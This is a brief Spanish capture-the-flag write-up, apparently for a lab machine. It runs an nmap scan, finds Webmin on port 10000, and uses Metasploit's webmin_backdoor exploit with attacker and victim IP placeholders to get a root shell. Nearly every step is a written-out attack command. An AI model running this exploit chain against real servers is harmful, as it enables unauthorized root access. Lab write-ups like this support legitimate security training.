Empezamos haciendo un reconocimiento básico con [[NMAP]]
`nmap -p- --open -sSCV  --min-rate 5000 -n -Pn 10.10.144.29 -oN ScanPorts.txt`

Encontramos levantados los puertos `22 SSH`, `10000 HTTP`. Navegaremos a la web en la que esta levantado el servicio `HTTP`

Vemos que el servicio que esta levant6ado al acceder hay un panel de login a Webadmin.
Usaremos [[METASPLOIT]] para ver si encontramos un exploit para este servicio
`search webmin`

Usaremos el exploit que nos habilita una backdoor.
`use  exploit/linux/http/webmin_backdoor`

Vemos las opciones de configuración.
`set RHOSTS <IP_Victima>`
`set SSL true`
`set LHOST <IP_Atacante>`

Ejecutamos el exploit con `run`
Nos obtiene una sesión pero para que sea mas legible ejecutamos el comando `shell`

Como la shell que obtenemos es de root, solo tendremos que navegar por los directorios para encontrar lo que se nos pida.

